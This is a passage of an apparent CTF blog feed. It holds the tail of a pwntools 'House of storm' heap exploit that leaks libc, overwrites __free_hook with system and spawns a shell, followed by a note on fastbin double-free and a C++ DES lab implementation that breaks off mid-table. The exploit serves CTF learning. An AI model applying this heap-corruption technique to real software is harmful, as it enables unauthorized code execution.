class="hljs-string">'\x00'</span> * <span class="hljs-number">0</span>x20 + <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x4e1) + <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-built_in">p64</span>(fake_chunk+<span class="hljs-number">8</span>) + <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-built_in">p64</span>(fake_chunk-<span class="hljs-number">0</span>x18-<span class="hljs-number">5</span>)<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">8</span>, payload) #修改 large chunk 的 bk 和 bk_nextsize<br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x48)  #<span class="hljs-number">2</span>  -&gt; <span class="hljs-number">0</span>x133707e0   成功将申请到了heaparray附近<br><br> <br><br>#-----------------------泄漏 libc----------------------------------#<br>#由于bins中的chunk的fd,bk指向libc的地址，我们先要泄漏heap的地址<br><br>payload = <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">6</span> + <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x13370800)<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">2</span>, payload) #修改了r0~r4为<span class="hljs-number">0</span>，并且修改了chunk0的地址，此时的chunk0的size非常大，因为异或的是<span class="hljs-number">0</span><br><br>#<span class="hljs-built_in">dbg</span>()<br> <br>payload = <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> +<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x13377331)  #满足show的条件<br><br>payload += <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x13370800) + <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x1000) #chunk0<br>payload += <span class="hljs-built_in">p64</span>(fake_chunk+<span class="hljs-number">3</span>) + <span class="hljs-built_in">p64</span>(<span class="hljs-number">8</span>)   #chunk1<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">0</span>, payload) #满足show的条件<br><br>#<span class="hljs-built_in">dbg</span>()<br><br><span class="hljs-built_in">show</span>(<span class="hljs-number">1</span>)  #我们刚刚house of storm 写的地址泄漏出来<br><span class="hljs-built_in">ru</span>(<span class="hljs-string">"]: "</span>)<br>heap = <span class="hljs-built_in">u64</span>(<span class="hljs-built_in">r</span>(<span class="hljs-number">6</span>).<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>, <span class="hljs-string">'\x00'</span>))<br><span class="hljs-built_in">success</span>(<span class="hljs-string">"heap:"</span>+<span class="hljs-built_in">hex</span>(heap))<br><br>#<span class="hljs-built_in">dbg</span>()<br><br>payload  = <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x13377331)#满足show的条件<br>payload += <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x13370800) + <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x1000) #chunk0<br>payload += <span class="hljs-built_in">p64</span>(heap+<span class="hljs-number">0</span>x10) + <span class="hljs-built_in">p64</span>(<span class="hljs-number">8</span>) #chunk1<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">0</span>, payload)<br><br>#<span class="hljs-built_in">dbg</span>()<br><br><span class="hljs-built_in">show</span>(<span class="hljs-number">1</span>) #泄漏libc地址<br><span class="hljs-built_in">ru</span>(<span class="hljs-string">"]: "</span>)<br>malloc_hook = <span class="hljs-built_in">u64</span>(<span class="hljs-built_in">r</span>(<span class="hljs-number">6</span>).<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>, <span class="hljs-string">'\x00'</span>)) -<span class="hljs-number">0</span>x58 - <span class="hljs-number">0</span>x10<br>libc_base = malloc_hook - libc.sym[<span class="hljs-string">'__malloc_hook'</span>]<br>free_hook = libc_base+libc.sym[<span class="hljs-string">'__free_hook'</span>]<br>system = libc_base+ libc.sym[<span class="hljs-string">'system'</span>]<br><span class="hljs-built_in">success</span>(<span class="hljs-string">"free_hook:"</span>+<span class="hljs-built_in">hex</span>(free_hook))<br> <br>#--------------修改 free_hook -----------------------------------#<br>payload  = <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span><br>payload += <span class="hljs-built_in">p64</span>(free_hook) + <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x100)#chunk0<br>payload += <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x13370800+<span class="hljs-number">0</span>x40) + <span class="hljs-built_in">p64</span>(<span class="hljs-number">8</span>)#chunk1<br>payload += <span class="hljs-string">'/bin/sh\x00'</span><br><span class="hljs-built_in">edit</span>(<span class="hljs-number">0</span>, payload)<br>#<span class="hljs-built_in">dbg</span>()<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">p64</span>(system))<br><span class="hljs-built_in">free</span>(<span class="hljs-number">1</span>)<br><br><span class="hljs-built_in">itr</span>()<br></code></pre></td></tr></tbody></table></figure><blockquote><p>参考文章<br><a href="https://www.anquanke.com/post/id/203096">House of storm 原理及利用</a><br><a href="https://www.freebuf.com/articles/system/209096.html">Largebin Attack</a><br><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/large-bin-attack/">CTF-WIKI</a><br><a href="https://bbs.pediy.com/thread-262424.htm#msg_header_h1_2">Largebin attack总结</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;House-of-storm&quot;&gt;&lt;a href=&quot;#House-of-storm&quot; class=&quot;headerlink&quot; title=&quot;House of storm&quot;&gt;&lt;/a&gt;House of storm&lt;/h1&gt;&lt;p&gt;结合了unsorted_bin_attack</summary>
      
    
    
    
    <category term="heap" scheme="https://kylinxin.github.io/categories/heap/"/>
    
    
    <category term="House of 系列" scheme="https://kylinxin.github.io/tags/House-of-%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>doublefree</title>
    <link href="https://kylinxin.github.io/2023/04/10/double%20free/"/>
    <id>https://kylinxin.github.io/2023/04/10/double%20free/</id>
    <published>2023-04-10T15:14:29.000Z</published>
    <updated>2023-09-12T09:16:05.295Z</updated>
    
    <content type="html"><![CDATA[<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><blockquote><p>1.fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空<br>2.fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。</p></blockquote><p>该漏洞是指将同一个chunk free两次，通常情况下free两个chunk会报错是无法编译的，监测机制也很简单，就仅仅是对free变量与前一个进行对比，所以可以中间夹一个其他的实现：</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(shangu1)</span></span><br><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(shangu2)</span></span><br><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(shangu1)</span></span><br></code></pre></td></tr></tbody></table></figure><p>此时的 bins 中情况大概如下：0x20 —&gt; shangu1 —&gt; shangu2 —&gt; shangu1<br>当再次申请堆时会出现 有两个指针指向同一个chunk</p><p>![联想截图_20230322221849.png](<a href="https://s2.loli.net/2023/09/12/BI6lRtbdPnKTuMN.png">https://s2.loli.net/2023/09/12/BI6lRtbdPnKTuMN.png</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;利用条件&quot;&gt;&lt;a href=&quot;#利用条件&quot; class=&quot;headerlink&quot; title=&quot;利用条件&quot;&gt;&lt;/a&gt;利用条件&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;1.fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空&lt;b</summary>
      
    
    
    
    <category term="heap" scheme="https://kylinxin.github.io/categories/heap/"/>
    
    
    <category term="fastbin attack" scheme="https://kylinxin.github.io/tags/fastbin-attack/"/>
    
  </entry>
  
  <entry>
    <title>密码学实验</title>
    <link href="https://kylinxin.github.io/2023/04/10/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AE%9E%E9%AA%8C/"/>
    <id>https://kylinxin.github.io/2023/04/10/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AE%9E%E9%AA%8C/</id>
    <published>2023-04-10T15:14:29.000Z</published>
    <updated>2023-05-05T12:10:42.242Z</updated>
    
    <content type="html"><![CDATA[<h2 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h2><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function">string <span class="hljs-title">string_to_hex</span><span class="hljs-params">(<span class="hljs-type">const</span> string&amp; str)</span> <span class="hljs-comment">//字符串转化为十六进制</span></span><br><span class="hljs-function"></span>{<br>    string result=<span class="hljs-string">""</span>;<br>    string tmp;<br>    stringstream ss;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;str.<span class="hljs-built_in">size</span>();i++)<br>    {<br>        ss&lt;&lt;hex&lt;&lt;<span class="hljs-built_in">int</span>(str[i])&lt;&lt;endl;<br>        ss&gt;&gt;tmp;<br>        result+=tmp;<br>    }<br>    <span class="hljs-keyword">return</span> result;<br>}<br><span class="hljs-function">string <span class="hljs-title">hex_to_string</span><span class="hljs-params">(<span class="hljs-type">const</span> std::string&amp; str)</span></span><br><span class="hljs-function"></span>{<br>    std::string result;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; str.<span class="hljs-built_in">length</span>(); i += <span class="hljs-number">2</span>)<span class="hljs-comment">//十六进制两个字符为原始字符一个字符</span><br>    {<br>        std::string byte = str.<span class="hljs-built_in">substr</span>(i, <span class="hljs-number">2</span>);<span class="hljs-comment">//每次切两个字符</span><br>        <span class="hljs-comment">//将十六进制的string转成long再强转成int再转成char</span><br>        <span class="hljs-type">char</span> chr = (<span class="hljs-type">char</span>)(<span class="hljs-type">int</span>)<span class="hljs-built_in">strtol</span>(byte.<span class="hljs-built_in">c_str</span>(), <span class="hljs-literal">NULL</span>, <span class="hljs-number">16</span>);<br>        result.<span class="hljs-built_in">push_back</span>(chr);<span class="hljs-comment">//将处理完的字符压入result中</span><br>    }<br>    <span class="hljs-keyword">return</span> result;<br>}<br><br><span class="hljs-function">string <span class="hljs-title">hex2bin</span><span class="hljs-params">(string s)</span></span><br><span class="hljs-function"></span>{<br>    <span class="hljs-comment">//十六进制转化为二进制</span><br>    unordered_map&lt;<span class="hljs-type">char</span>, string&gt; mp;<br>    mp[<span class="hljs-string">'0'</span>] = <span class="hljs-string">"0000"</span>;<br>    mp[<span class="hljs-string">'1'</span>] = <span class="hljs-string">"0001"</span>;<br>    mp[<span class="hljs-string">'2'</span>] = <span class="hljs-string">"0010"</span>;<br>    mp[<span class="hljs-string">'3'</span>] = <span class="hljs-string">"0011"</span>;<br>    mp[<span class="hljs-string">'4'</span>] = <span class="hljs-string">"0100"</span>;<br>    mp[<span class="hljs-string">'5'</span>] = <span class="hljs-string">"0101"</span>;<br>    mp[<span class="hljs-string">'6'</span>] = <span class="hljs-string">"0110"</span>;<br>    mp[<span class="hljs-string">'7'</span>] = <span class="hljs-string">"0111"</span>;<br>    mp[<span class="hljs-string">'8'</span>] = <span class="hljs-string">"1000"</span>;<br>    mp[<span class="hljs-string">'9'</span>] = <span class="hljs-string">"1001"</span>;<br>    mp[<span class="hljs-string">'A'</span>] = <span class="hljs-string">"1010"</span>;<br>    mp[<span class="hljs-string">'B'</span>] = <span class="hljs-string">"1011"</span>;<br>    mp[<span class="hljs-string">'C'</span>] = <span class="hljs-string">"1100"</span>;<br>    mp[<span class="hljs-string">'D'</span>] = <span class="hljs-string">"1101"</span>;<br>    mp[<span class="hljs-string">'E'</span>] = <span class="hljs-string">"1110"</span>;<br>    mp[<span class="hljs-string">'F'</span>] = <span class="hljs-string">"1111"</span>;<br>    string bin = <span class="hljs-string">""</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; s.<span class="hljs-built_in">size</span>(); i++) {<br>        bin += mp[s[i]];<br>    }<br>    <span class="hljs-keyword">return</span> bin;<br>}<br><span class="hljs-function">string <span class="hljs-title">bin2hex</span><span class="hljs-params">(string s)</span></span><br><span class="hljs-function"></span>{<br>    <span class="hljs-comment">// 二进制转化为16进制</span><br>    unordered_map&lt;string, string&gt; mp;<br>    mp[<span class="hljs-string">"0000"</span>] = <span class="hljs-string">"0"</span>;<br>    mp[<span class="hljs-string">"0001"</span>] = <span class="hljs-string">"1"</span>;<br>    mp[<span class="hljs-string">"0010"</span>] = <span class="hljs-string">"2"</span>;<br>    mp[<span class="hljs-string">"0011"</span>] = <span class="hljs-string">"3"</span>;<br>    mp[<span class="hljs-string">"0100"</span>] = <span class="hljs-string">"4"</span>;<br>    mp[<span class="hljs-string">"0101"</span>] = <span class="hljs-string">"5"</span>;<br>    mp[<span class="hljs-string">"0110"</span>] = <span class="hljs-string">"6"</span>;<br>    mp[<span class="hljs-string">"0111"</span>] = <span class="hljs-string">"7"</span>;<br>    mp[<span class="hljs-string">"1000"</span>] = <span class="hljs-string">"8"</span>;<br>    mp[<span class="hljs-string">"1001"</span>] = <span class="hljs-string">"9"</span>;<br>    mp[<span class="hljs-string">"1010"</span>] = <span class="hljs-string">"A"</span>;<br>    mp[<span class="hljs-string">"1011"</span>] = <span class="hljs-string">"B"</span>;<br>    mp[<span class="hljs-string">"1100"</span>] = <span class="hljs-string">"C"</span>;<br>    mp[<span class="hljs-string">"1101"</span>] = <span class="hljs-string">"D"</span>;<br>    mp[<span class="hljs-string">"1110"</span>] = <span class="hljs-string">"E"</span>;<br>    mp[<span class="hljs-string">"1111"</span>] = <span class="hljs-string">"F"</span>;<br>    string hex = <span class="hljs-string">""</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; s.<span class="hljs-built_in">length</span>(); i += <span class="hljs-number">4</span>) {<br>        string ch = <span class="hljs-string">""</span>;<br>        ch += s[i];<br>        ch += s[i + <span class="hljs-number">1</span>];<br>        ch += s[i + <span class="hljs-number">2</span>];<br>        ch += s[i + <span class="hljs-number">3</span>];<br>        hex += mp[ch];<br>    }<br>    <span class="hljs-keyword">return</span> hex;<br>}<br><br><span class="hljs-function">string <span class="hljs-title">permute</span><span class="hljs-params">(string k, <span class="hljs-type">int</span>* arr, <span class="hljs-type">int</span> n)</span></span><br><span class="hljs-function"></span>{<br>    string per = <span class="hljs-string">""</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) {<br>        per += k[arr[i] - <span class="hljs-number">1</span>];<br>    }<br>    <span class="hljs-keyword">return</span> per;<br>}<br><br><span class="hljs-function">string <span class="hljs-title">shift_left</span><span class="hljs-params">(string k, <span class="hljs-type">int</span> shifts)</span></span><br><span class="hljs-function"></span>{<br>    string s = <span class="hljs-string">""</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; shifts; i++) {<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt; <span class="hljs-number">28</span>; j++) {<br>            s += k[j];<br>        }<br>        s += k[<span class="hljs-number">0</span>];<br>        k = s;<br>        s = <span class="hljs-string">""</span>;<br>    }<br>    <span class="hljs-keyword">return</span> k;<br>}<br><br><span class="hljs-function">string <span class="hljs-title">xor_</span><span class="hljs-params">(string a, string b)</span></span><br><span class="hljs-function"></span>{<br>    string ans = <span class="hljs-string">""</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; a.<span class="hljs-built_in">size</span>(); i++) {<br>        <span class="hljs-keyword">if</span> (a[i] == b[i]) {<br>            ans += <span class="hljs-string">"0"</span>;<br>        }<br>        <span class="hljs-keyword">else</span> {<br>            ans += <span class="hljs-string">"1"</span>;<br>        }<br>    }<br>    <span class="hljs-keyword">return</span> ans;<br>}<br><span class="hljs-function">string <span class="hljs-title">encrypt</span><span class="hljs-params">(string pt, vector&lt;string&gt; rkb,</span></span><br><span class="hljs-params"><span class="hljs-function">               vector&lt;string&gt; rk)</span></span><br><span class="hljs-function"></span>{<br>    <span class="hljs-comment">// 16-&gt;2</span><br>    pt = <span class="hljs-built_in">hex2bin</span>(pt);<br><br>    <span class="hljs-comment">// 初始置换</span><br>    <span class="hljs-type">int</span> initial_perm[<span class="hljs-number">64</span>]<br>            = { <span class="hljs-number">58</span>, <span class="hljs-number">50</span>, <span class="hljs-number">42</span>, <span class="hljs-number">34</span>, <span class="hljs-number">26</span>, <span class="hljs-number">18</span>, <span class="hljs-number">10</span>, <span class="hljs-number">2</span>,  <span class="hljs-number">60</span>, <span class="hljs-number">52</span>, <span class="hljs-number">44</span>,<br>                <span class="hljs-number">36</span>, <span class="hljs-number">28</span>, <span class="hljs-number">20</span>, <span class="hljs-number">12</span>, <span class="hljs-number">4</span>,  <span class="hljs-number">62</span>, <span class="hljs-number">54</span>, <span class="hljs-number">46</span>, <span class="hljs-number">38</span>, <span class="hljs-number">30</span>, <span class="hljs-number">22</span>,<br>                <span class="hljs-number">14</span>, <span class="hljs-number">6</span>,  <span class="hljs-number">64</span>, <span class="hljs-number">56</span>, <span class="hljs-number">48</span>, <span class="hljs-number">40</span>, <span class="hljs-number">32</span>, <span class="hljs-number">24</span>, <span class="hljs-number">16</span>, <span class="hljs-number">8</span>,  <span class="hljs-number">57</span>,<br>                <span class="hljs-number">49</span>, <span class="hljs-number">41</span>, <span class="hljs-number">33</span>, <span class="hljs-number">25</span>, <span class="hljs-number">17</span>, <span class="hljs-number">9</span>,  <span class="hljs-number">1</span>,  <span class="hljs-number">59</span>, <span class="hljs-number">51</span>, <span class="hljs-number">43</span>, <span class="hljs-number">35</span>,<br>                <span class="hljs-number">27</span>, <span class="hljs-number">19</span>, <span class="hljs-number">11</span>, <span class="hljs-number">3</span>,  <span class="hljs-number">61</span>, <span class="hljs-number">53</span>, <span class="hljs-number">45</span>, <span class="hljs-number">37</span>, <span class="hljs-number">29</span>, <span class="hljs-number">21</span>, <span class="hljs-number">13</span>,<br>                <span class="hljs-number">5</span>,  <span class="hljs-number">63</span>, <span class="hljs-number">55</span>, <span class="hljs-number">47</span>, <span class="hljs-number">39</span>, <span class="hljs-number">31</span>, <span class="hljs-number">23</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span> };<br>    <span class="hljs-comment">// 初始置换</span><br>    pt = <span class="hljs-built_in">permute</span>(pt, initial_perm, <span class="hljs-number">64</span>);<br>    cout &lt;&lt; <span class="hljs-string">"初始置换后: "</span> &lt;&lt; <span class="hljs-built_in">bin2hex</span>(pt)<br>         &lt;&lt; endl;<br><br>    <span class="hljs-comment">// 拆分成左右32比特</span><br>    string left = pt.<span class="hljs-built_in">substr</span>(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>);<br>    string right = pt.<span class="hljs-built_in">substr</span>(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>);<br>    cout &lt;&lt; <span class="hljs-string">"拆分后: L0="</span> &lt;&lt; <span class="hljs-built_in">bin2hex</span>(left)<br>         &lt;&lt; <span class="hljs-string">" R0="</span> &lt;&lt; <span class="hljs-built_in">bin2hex</span>(right) &lt;&lt; endl;<br><br>    <span class="hljs-comment">// E盒扩展</span><br>    <span class="hljs-type">int</span> exp_d[<span class="hljs-number">48</span>]<br>            = { <span class="hljs-number">32</span>, <span class="hljs-number">1</span>,  <span class="hljs-number">2</span>,  <span class="hljs-number">3</span>,  <span class="hljs-number">4</span>,  <span class="hljs-number">5</span>,  <span class="hljs-number">4</span>,  <span class="hljs-number">5</span>,  <span class="hljs-number">6</span>,  <span class="hljs-number">7</span>,  <span class="hljs-number">8</span>,  <span class="hljs-number">9</span>,<br>                <span class="hljs-number">8</span>,  <span class="hljs-number">9</span>,  <span class="hljs-number">10</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12</span>, <span class="hljs-number">13</span>, <span class="hljs-number">12</span>, <span class="hljs-number">13</span>, <span class="hljs-number">14</span>, <span class="hljs-number">15</span>, <span class="hljs-number">16</span>, <span class="hljs-number">17</span>,<br>                <span class="hljs-number">16</span>, <span class="hljs-number">17</span>, <span class="hljs-number">18</span>, <span class="hljs-number">19</span>, <span class="hljs-number">20</span>, <span class="hljs-number">21</span>, <span class="hljs-number">20</span>, <span class="hljs-number">21</span>, <span class="hljs-number">22</span>, <span class="hljs-number">23</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>,<br>                <span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">26</span>, <span class="hljs-number">27</span>, <span class="hljs-number">28</span>, <span class="hljs-number">29</span>, <span class="hljs-number">28</span>, <span class="hljs-number">29</span>, <span class="hljs-number">30</span>, <span class="hljs-number">31</span>, <span class="hljs-number">32</span>, <span class="hljs-number">1</span> };<br><br>    <span class="hljs-comment">// S盒</span><br>    <span class="hljs-type">int</span> s[<span class="hljs-number">8</span>][<span class="hljs-number">4</span>][<span class="hljs-number">16</span>] = {<br>            { <span class="hljs-number">14</span>, <span class="hljs-number">4</span>,  <span class="hljs-number">13</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>,  <span class="hljs-number">15</span>, <span class="hljs-number">11</span>, <span class="hljs-number">8</span>,  <span class="hljs-number">3</span>,  <span class="hljs-number">10</span>, <span class="hljs-number">6</span>,  <span class="hljs-number">12</span>, <span class="hljs-number">5</span>,<span class="hljs-number">9</span>,  <span class="hljs-number">0</span>,  <span class="hljs-number">7</span>,  <span class="hljs-number">0</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>,  <span class="hljs-number">4</span>,  <span class="hljs-number">14</span>, <span class="hljs-number">2</span>,  <span class="hljs-number">13</span>, <span class="hljs-number">1</span>,  <span class="hljs-number">10</span>, <span class="hljs-number">6</span>,<span class="hljs-number">12</span>, <span class="hljs-number">11</span>, <span class="hljs-number">9</span>,  <span class="hljs-number">5</span>, <span class="hljs-number">3</span>,  <span class="hljs-number">8</span>,  <span class="hljs-number">4</span>,  <span class="hljs-number">1</span>,  <span class="hljs-number">14</span>, <span class="hljs-number">8</span>,  <span class="hljs-number">13</span>, <span class="hljs-number">6</span>,  <span class="hljs-number">2</span>, <span class="hljs-number">11</span>, <span class="hljs-number">15</span>, <span class="hljs-number">12</span>, <span class="hljs-number">9</span>, <span class="hljs-number">7</span>,  <span class="hljs-number">3</span>,  <span class="hljs-number">10</span>, <span class="hljs-number">5</span>,  <span class="hljs-number">0</span>,  <span class="hljs-number">15</span>, <span class="hljs-number">12</span>, <span class="hljs-number">8</span>,  <span class="hljs-number">2</span>, <span class="hljs-number">4</span>,  <span class="hljs-number">9</span>,  <span class="hljs-number">1</span>,  <span class="hljs-number">7</span>, <span 